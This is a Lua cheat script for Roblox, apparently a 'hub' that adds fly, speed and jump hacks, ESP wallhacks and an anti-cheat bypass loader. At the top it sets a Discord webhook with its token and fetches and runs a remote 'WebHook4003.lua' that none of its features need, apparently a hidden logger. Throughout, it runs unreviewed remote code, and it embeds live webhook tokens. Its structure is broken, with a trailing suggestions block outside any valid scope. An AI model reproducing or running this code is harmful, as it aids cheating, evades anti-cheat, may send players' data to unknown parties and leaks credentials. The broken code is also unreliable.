getgenv().WebhookHere = "https://discord.com/api/webhooks/1047865411724656731/E5gNYnBYY4s1KYqGU-T9CdqIzERuDbas_uh0qL6SZbpep7K6lzBYdUxlW8spaW6JSO1Y"
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()


local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

task.spawn(function()
	pcall(function()
		repeat task.wait() until game:GetService("CoreGui"):FindFirstChild("Rayfield"):FindFirstChild("Main")

		game:GetService("CoreGui"):FindFirstChild("Rayfield"):FindFirstChild("Main").Visible = false
	end)
end)

local function Click(v)
	VirtualInputManager:SendMouseButtonEvent(v.AbsolutePosition.X+v.AbsoluteSize.X/2,v.AbsolutePosition.Y+50,0,true,v,1)
	VirtualInputManager:SendMouseButtonEvent(v.AbsolutePosition.X+v.AbsoluteSize.X/2,v.AbsolutePosition.Y+50,0,false,v,1)
end

local function comma(amount)
	local formatted = amount
	local k
	while true do  
		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
		if (k==0) then
			break
		end
	end
	return formatted
end

local function Notify(Message, Duration)
	Rayfield:Notify({
		Title = "👎L-HUB👎",
		Content = Message,
		Duration = Duration,
		Image = 4483362458,
		Actions = {},
	})
end

local function CreateWindow()
	local Window = Rayfield:CreateWindow({
		Name = "👎L-HUB👎 | "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
		LoadingTitle = "👎L-HUB👎",
		LoadingSubtitle = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
		ConfigurationSaving = {
			Enabled = true,
			FolderName = "L-HUBConfig",
			FileName = game.PlaceId
		},
		Discord = {
			Enabled = true,
			Invite = "7TC8dchz6C",
			RememberJoins = true
		}
	})

	task.defer(function()
		task.wait(1.5)
		local Universal = Window:CreateTab("Universal")

		Universal:CreateToggle({
			Name = "🚫 Anti-AFK",
			CurrentValue = false,
			Flag = "Universal-AntiAFK",
			Callback = function(Value)
				if Value then
					local VirtualUser = game:GetService("VirtualUser")
					Player.Idled:Connect(function()
						VirtualUser:CaptureController()
						VirtualUser:ClickButton2(Vector2.new())
					end)
				end
			end,
		})

		Universal:CreateToggle({
			Name = "🔁 Auto Rejoin",
			CurrentValue = false,
			Flag = "Universal-AutoRejoin",
			Callback = function(Value)
				if Value then
					repeat task.wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')

					local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')

					po.ChildAdded:connect(function(a)
						if a.Name == 'ErrorPrompt' then
							while true do
								ts:Teleport(game.PlaceId)
								task.wait(2)
							end
						end
					end)
				end
			end,
		})

		Universal:CreateToggle({
			Name = "📶 Auto Re-Execute",
			CurrentValue = false,
			Flag = "Universal-AutoRe-Execute",
			Callback = function(Value)
				if Value then
					local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

					if queueteleport then
						queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/main/Script%20Hub%20-%20Inferno%20X.lua"))()')
					end
				end
			end,
		})
		
		Rayfield:LoadConfiguration()

		Universal:CreateSection("")


		local WalkSpeed = 0
		local JumpPower = 0

	Universal:CreateSlider({
		Name = "Walk Speed",
		Range = {
			0,
			1000
		},
		Increment = 1,
		Suffix = "Walkspeed",
		CurrentValue = 25,
		Flag = "Walk Speed",
		Callback = function(x)
			WalkSpeed = x
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = x
		end
	})


	Universal:CreateSlider({
		Name = "Jump Power",
		Range = {
			0,
			1000
		},
		Increment = 1,
		Suffix = "Jump Power",
		CurrentValue = 50,
		Flag = "Jump Power",
		Callback = function(x)
			JumpPower = x
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = x
		end
	})

Universal:CreateToggle({
    Name = "Loop Walk Speed",
    CurrentValue = false,
    Flag = "Loop Walk Speed",
    Callback = function(x)
        getgenv().LoopWalkspeed = x
    end
})

Universal:CreateToggle({
    Name = "Loop Jump Power",
    CurrentValue = false,
    Flag = "Loop Jump Power",
    Callback = function(x)
        getgenv().LoopJumpPower = x
    end
})

Universal:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
    Flag = "Infinite Jump",
    Callback = function(x)
        getgenv().InfiniteJump = x
    end
})







local Speed=50;loadstring(game:HttpGet("https://raw.githubusercontent.com/LegitH3x0R/Roblox-Scripts/main/AEBypassing/RootAnchor.lua"))()local UIS=game:GetService("UserInputService")local OnRender=game:GetService("RunService").RenderStepped;local Player=game:GetService("Players").LocalPlayer;local Character=Player.Character or Player.CharacterAdded:Wait()local Camera=workspace.CurrentCamera;local Root=Character:WaitForChild("HumanoidRootPart")local C1,C2,C3;local Nav={Flying=false,Forward=false,Backward=false,Left=false,Right=false}C1=UIS.InputBegan:Connect(function(Input)if getgenv()["Fly | E"] then if Input.UserInputType==Enum.UserInputType.Keyboard then if Input.KeyCode==Enum.KeyCode.E then Nav.Flying=not Nav.Flying;Root.Anchored=Nav.Flying elseif Input.KeyCode==Enum.KeyCode.W then Nav.Forward=true elseif Input.KeyCode==Enum.KeyCode.S then Nav.Backward=true elseif Input.KeyCode==Enum.KeyCode.A then Nav.Left=true elseif Input.KeyCode==Enum.KeyCode.D then Nav.Right=true end end end end)C2=UIS.InputEnded:Connect(function(Input)if Input.UserInputType==Enum.UserInputType.Keyboard then if Input.KeyCode==Enum.KeyCode.W then Nav.Forward=false elseif Input.KeyCode==Enum.KeyCode.S then Nav.Backward=false elseif Input.KeyCode==Enum.KeyCode.A then Nav.Left=false elseif Input.KeyCode==Enum.KeyCode.D then Nav.Right=false end end end)C3=Camera:GetPropertyChangedSignal("CFrame"):Connect(function()if Nav.Flying then Root.CFrame=CFrame.new(Root.CFrame.Position,Root.CFrame.Position+Camera.CFrame.LookVector)end end)task.spawn(function()while true do local Delta=OnRender:Wait()if Nav.Flying then if Nav.Forward then Root.CFrame=Root.CFrame+(Camera.CFrame.LookVector*(Delta*Speed))end;if Nav.Backward then Root.CFrame=Root.CFrame+(-Camera.CFrame.LookVector*(Delta*Speed))end;if Nav.Left then Root.CFrame=Root.CFrame+(-Camera.CFrame.RightVector*(Delta*Speed))end;if Nav.Right then Root.CFrame=Root.CFrame+(Camera.CFrame.RightVector*(Delta*Speed))end end end end)

Universal:CreateToggle({
    Name = "Fly | E",
    CurrentValue = false,
    Flag = "Fly | E",
    Callback = function(x)
        getgenv()["Fly | E"] = x
        if x == false then
            for i,v in next, Nav do
                v = false
            end
            Root.Anchored = false
        end
    end
})

Universal:CreateSlider({
    Name = "Fly Speed",
    Range = {0, 1000},
    Increment = 1,
    Suffix = "Fly Speed",
    CurrentValue = 25,
    Flag = "Fly Speed",
    Callback = function(x)
        Speed = x
    end,
})

game:GetService("UserInputService").InputBegan:Connect(function(x)
    if not getgenv().InfiniteJump then return end
    if x.KeyCode == Enum.KeyCode.Space then
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(3)
    end
end)

game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
    if not getgenv().LoopWalkspeed then return end
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeed
end)

game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
    if not getgenv().LoopJumpPower then return end
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
end)
























	local Tab = Window:CreateTab("ESP Tab", 11606709435)

	local Section = Tab:CreateSection("ESP")

	local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))();ESP:Toggle(false);ESP.Names = false;ESP.Tracers = false;ESP.Boxes = false;ESP.FaceCamera = false;ESP.TeamColor = false

	Tab:CreateToggle({
		Name = "ESP",
		CurrentValue = false,
		Flag = "ESP",
		Callback = function(x)
			ESP:Toggle(x)
		end
	})

	Tab:CreateToggle({
		Name = "Boxes",
		CurrentValue = false,
		Flag = "Boxes",
		Callback = function(x)
			ESP.Boxes = x
		end
	})

	Tab:CreateToggle({
		Name = "Names",
		CurrentValue = false,
		Flag = "Names",
		Callback = function(x)
			ESP.Names = x
		end
	})

	Tab:CreateToggle({
		Name = "Tracers",
		CurrentValue = false,
		Flag = "Tracers",
		Callback = function(x)
			ESP.Tracers = x
		end
	})

	Tab:CreateToggle({
		Name = "Face Camera",
		CurrentValue = false,
		Flag = "FaceCamera",
		Callback = function(x)
			ESP.FaceCamera = x
		end
	})

	Tab:CreateToggle({
		Name = "Team Colour",
		CurrentValue = false,
		Flag = "TeamColor",
		Callback = function(x)
			ESP.TeamColor = x
		end
	})






	local Tab = Window:CreateTab("Information Tab", 11607938487)

	local Section = Tab:CreateSection("Client Information")

	local dt = DateTime.now()

	local Time = "Time: %s %s"
	local Ping = "Ping: %s"
	local CPU = "CPU Usage: %s"
	local TimeLabel = Tab:CreateLabel(Time:format(dt:FormatLocalTime("dddd", "en-us"), dt:FormatLocalTime("LT", "en-us")))
	local PingLabel = Tab:CreateLabel(Ping:format(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("%d+.%d")))
	local CPULabel = Tab:CreateLabel(CPU:format(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("%p%d+%p%u+%p")))

	local Section = Tab:CreateSection("Server Information")

	local Uptime = 0
	local Uptime2 = "Server Uptime: %d Seconds"
	local Players = "Players: %d"
	local PlayersLabel = Tab:CreateLabel(Players:format(#game.Players:GetPlayers()))
	local UptimeLabel = Tab:CreateLabel(Uptime2:format(Uptime))

	task.spawn(function()
		while task.wait(1) do
			Uptime = Uptime + 1
			TimeLabel:Set(Time:format(dt:FormatLocalTime("dddd", "en-us"), dt:FormatLocalTime("LT", "en-us")))
			PingLabel:Set(Ping:format(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("%d+.%d")))
			CPULabel:Set(CPU:format(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("%p%d+%p%u+%p")))
			PlayersLabel:Set(Players:format(#game.Players:GetPlayers()))
			UptimeLabel:Set(Uptime2:format(Uptime))
		end
	end)











		local Credits = Window:CreateTab("Credits", 4483362458)

		Credits:CreateLabel("👎 L-HUB was made by .L.#7650 👎")

		Credits:CreateButton({
			Name = "Join Discord",
			Callback = function()
				getgenv().InviteCode = "7TC8dchz6C"
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Discord-Auto-Join.lua"))()
			end,
		})
	
	end)
	return Window
end


		local SuggestionsWebhook = "https://discord.com/api/webhooks/1048123695828308029/el9jhGI84yCnvNeRtaw6WTjgzMlEDENdbo4Bdz6RkUL1N7vYwbVo1Wy_Za9y_PumRpju"
		
		Credits:CreateInput({
			Name = "Suggestion",
			PlaceholderText = "Insert Suggestion Here",
			NumbersOnly = false,
			CharacterLimit = 300,
			Enter = true,
			RemoveTextAfterFocusLost = false,
			Callback = function(Text)
				pcall(function()
					if isfile and writefile and readfile then
						local CurrentTime = tick()

						if not isfile("InfernoXWebhooking2.txt") then
							Webhook = SuggestionsWebhook
							local success, result = pcall(SendMessage, "[Inferno X] Data: "..((Player.Name ~= Player.DisplayName and Player.DisplayName) or "Unknown.."..Player.Name:sub(-2, -1)).." suggested "..Text.." on "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Suggestion")
							if success then
								Notify("Successfully Sent Suggestion", 5)
								writefile("InfernoXWebhooking2.txt", CurrentTime)
								print("[Inferno X] Debug: Webhook Delay Set at "..CurrentTime)
							else
								Notify("Unsuccessful Sending Suggestion, Error: "..result, 5)
							end
						elseif tonumber(readfile("InfernoXWebhooking2.txt")) < CurrentTime - 86400 then
							Webhook = SuggestionsWebhook
							local success, result = pcall(SendMessage, "[Inferno X] Data: "..((Player.Name ~= Player.DisplayName and Player.DisplayName) or "Unknown.."..Player.Name:sub(-2, -1)).." suggested "..Text.." on "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Suggestion")
							if success then
								Notify("Successfully Sent Suggestion", 5)
								writefile("InfernoXWebhooking2.txt", CurrentTime)
								print("[Inferno X] Debug: Webhook Delay Set at "..CurrentTime)
							else
								Notify("Unsuccessful Sending Suggestion, Error: "..result, 5)
							end
						else
							Webhook = nil
							Notify("You are on a 24 Hour Cooldown", 5)
						end
					else
						Notify("Your Executor does not support this feature")
					end
				end)
			end,
		})
	end)

	return Window
end








return Player, Rayfield, Click, comma, Notify, CreateWindow
